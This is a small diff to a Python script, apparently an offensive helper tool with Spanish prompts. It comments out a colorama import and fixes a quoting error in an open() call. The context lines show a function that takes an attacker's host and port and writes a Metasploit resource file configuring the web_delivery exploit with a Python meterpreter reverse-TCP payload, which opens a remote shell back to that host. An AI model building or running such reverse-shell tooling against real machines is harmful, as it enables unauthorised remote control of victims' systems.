@@ -4,7 +4,7 @@
 import os
 import socket
 import time
-import colorama
+#import colorama
 #from colorama import Fore, Back, Style
 
 ##Declaraciones de Funciones ##
@@ -421,7 +421,7 @@ def code3():
     lhost = input("Escribe la dirección ip o dns: ")
     lport = int(input("Escribe el puerto: "))
     os.system('cls' if os.name == 'nt' else 'clear')
-    f = open(r"C:\metasploit\meta.rc", "w+"")
+    f = open(r"C:\metasploit\meta.rc", "w+")
     for i in range(1):
         f.write("use exploit/multi/script/web_delivery\n")
         f.write("set payload python/meterpreter_reverse_tcp\n")
